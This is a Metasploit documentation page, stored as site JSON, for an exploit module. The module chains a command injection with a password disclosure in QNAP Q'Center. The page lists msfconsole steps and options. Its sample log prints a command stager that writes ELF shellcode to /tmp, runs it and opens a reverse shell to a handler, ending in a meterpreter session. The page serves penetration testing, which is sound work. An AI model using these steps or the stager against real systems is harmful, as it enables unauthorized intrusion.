{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/linux/http/qnap_qcenter_change_passwd_exec","result":{"data":{"moduleMetadataJson":{"id":"269c4d18-ebe9-5927-aba4-7a1f23744475","name":"QNAP Q'Center change_passwd Command Execution","fullname":"exploit/linux/http/qnap_qcenter_change_passwd_exec","description":"This module exploits a command injection vulnerability in the\n        `change_passwd` API method within the web interface of QNAP Q'Center\n        virtual appliance versions prior to 1.7.1083.\n\n        The vulnerability allows the 'admin' privileged user account to\n        execute arbitrary commands as the 'admin' operating system user.\n\n        Valid credentials for the 'admin' user account are required, however,\n        this module also exploits a separate password disclosure issue which\n        allows any authenticated user to view the password set for the 'admin'\n        user during first install.\n\n        This module has been tested successfully on QNAP Q'Center appliance\n        version 1.6.1075.","rank":600,"fields":{"detailsSlug":"/modules/details/exploit/linux/http/qnap_qcenter_change_passwd_exec","documentationSlug":"/modules/documentation/exploit/linux/http/qnap_qcenter_change_passwd_exec"},"documentation":{"html":"<h2 id=\"description\" style=\"position:relative;\"><a href=\"#description\" aria-label=\"description permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Description</h2>\n<p>  This module exploits a command injection vulnerability in the\n<code class=\"language-text\">change_passwd</code> API method within the web interface of QNAP Q'Center\nvirtual appliance versions prior to 1.7.1083.</p>\n<p>  The vulnerability allows the <code class=\"language-text\">admin</code> privileged user account to\nexecute arbitrary commands as the <code class=\"language-text\">admin</code> operating system user.</p>\n<p>  Valid credentials for the <code class=\"language-text\">admin</code> user account are required, however,\nthis module also exploits a separate password disclosure issue which\nallows any authenticated user to view the password set for the <code class=\"language-text\">admin</code>\nuser during first install.</p>\n<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<p>  <a href=\"https://www.qnap.com/solution/qcenter/index.php\">QNAP Q'Center</a> is a central\nmanagement platform that enables you to consolidate the management of multiple\nQNAP NAS devices.</p>\n<p>  This module has been tested successfully on QNAP Q'Center appliance\nversion 1.6.1075.</p>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<ol>\n<li>Start <code class=\"language-text\">msfconsole</code></li>\n<li><code class=\"language-text\">use exploit/linux/http/qnap_qcenter_change_passwd_exec</code></li>\n<li><code class=\"language-text\">set RHOSTS &lt;IP&gt;</code></li>\n<li><code class=\"language-text\">set USERNAME &lt;USERNAME&gt;</code> (default: <code class=\"language-text\">admin</code>)</li>\n<li><code class=\"language-text\">set PASSWORD &lt;PASSWORD&gt;</code> (default: <code class=\"language-text\">admin</code>)</li>\n<li><code class=\"language-text\">run</code></li>\n<li>You should get a session</li>\n</ol>\n<h2 id=\"options\" style=\"position:relative;\"><a href=\"#options\" aria-label=\"options permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Options</h2>\n<p>  <strong>USERNAME</strong></p>\n<p>  Username for the application. (default: <code class=\"language-text\">admin</code>)</p>\n<p>  <strong>PASSWORD</strong></p>\n<p>  Password for the application. (default: <code class=\"language-text\">admin</code>)</p>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf5 &gt; use exploit/linux/http/qnap_qcenter_change_passwd_exec \nmsf5 exploit(linux/http/qnap_qcenter_change_passwd_exec) &gt; set rhosts 10.1.1.112\nrhosts =&gt; 10.1.1.112\nmsf5 exploit(linux/http/qnap_qcenter_change_passwd_exec) &gt; set verbose true\nverbose =&gt; true\nmsf5 exploit(linux/http/qnap_qcenter_change_passwd_exec) &gt; check\n\n[*] Target is QNAP Q&#39;Center appliance version 1.6.1075\n[*] 10.1.1.112:443 The target appears to be vulnerable.\nmsf5 exploit(linux/http/qnap_qcenter_change_passwd_exec) &gt; run\n\n[*] Started reverse TCP handler on 10.1.1.197:4444 \n[*] Target is QNAP Q&#39;Center appliance version 1.6.1075\n[+] Authenticated as user &#39;admin&#39; successfully\n[*] Sending payload ...\n[*] Generated command stager: [&quot;printf &#39;\\\\177\\\\105\\\\114\\\\106\\\\1\\\\1\\\\1\\\\0\\\\0\\\\0\\\\0\\\\0\\\\0\\\\0\\\\0\\\\0\\\\2\\\\0\\\\3\\\\0\\\\1\\\\0\\\\0\\\\0\\\\124\\\\200\\\\4\\\\10\\\\64\\\\0\\\\0\\\\0\\\\0\\\\0\\\\0\\\\0\\\\0\\\\0\\\\0\\\\0\\\\64\\\\0\\\\40\\\\0\\\\1\\\\0\\\\0\\\\0\\\\0\\\\0\\\\0\\\\0\\\\1\\\\0\\\\0\\\\0\\\\0\\\\0\\\\0\\\\0\\\\0\\\\200\\\\4\\\\10\\\\0\\\\200\\\\4\\\\10\\\\317\\\\0\\\\0\\\\0\\\\112\\\\1\\\\0\\\\0\\\\7\\\\0\\\\0\\\\0\\\\0\\\\20\\\\0\\\\0\\\\152\\\\12\\\\136\\\\61\\\\333\\\\367\\\\343\\\\123\\\\103\\\\123\\\\152\\\\2\\\\260\\\\146\\\\211\\\\341\\\\315\\\\200\\\\227\\\\133\\\\150\\\\12\\\\1\\\\1\\\\305\\\\150\\\\2\\\\0\\\\21\\\\134\\\\211\\\\341\\\\152\\\\146\\\\130\\\\120\\\\121\\\\127\\\\211\\\\341\\\\103\\\\315\\\\200\\\\205\\\\300\\\\171\\\\31\\\\116\\\\164\\\\75\\\\150\\\\242\\\\0\\\\0\\\\0\\\\130\\\\152\\\\0\\\\152\\\\5\\\\211\\\\343\\\\61\\\\311\\\\315\\\\200\\\\205\\\\300\\\\171\\\\275\\\\353\\\\47\\\\262\\\\7\\\\271\\\\0\\\\20\\\\0\\\\0\\\\211\\\\343\\\\301\\\\353\\\\14\\\\301\\\\343\\\\14\\\\260\\\\175\\\\315\\\\200\\\\205\\\\300\\\\170\\\\20\\\\133\\\\211\\\\341\\\\231\\\\266\\\\14\\\\260\\\\3\\\\315\\\\200\\\\205\\\\300\\\\170\\\\2\\\\377\\\\341\\\\270\\\\1\\\\0\\\\0\\\\0\\\\273\\\\1\\\\0\\\\0\\\\0\\\\315\\\\200&#39;&gt;&gt;/tmp/ivFxR ; chmod +x /tmp/ivFxR ; /tmp/ivFxR ; rm -f /tmp/ivFxR&quot;]\n[*] Transmitting intermediate stager...(106 bytes)\n[*] Sending stage (861480 bytes) to 10.1.1.112\n[*] Command Stager progress - 100.00% done (701/701 bytes)\n\nmeterpreter &gt; getuid\nServer username: uid=1001, gid=1001, euid=1001, egid=1001\nmeterpreter &gt; sysinfo\nComputer     : 10.1.1.112\nOS           : Ubuntu 14.04 (Linux 3.13.0-32-generic)\nArchitecture : x64\nBuildTuple   : i486-linux-musl\nMeterpreter  : x86/linux\nmeterpreter &gt; </code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"269c4d18-ebe9-5927-aba4-7a1f23744475"}}}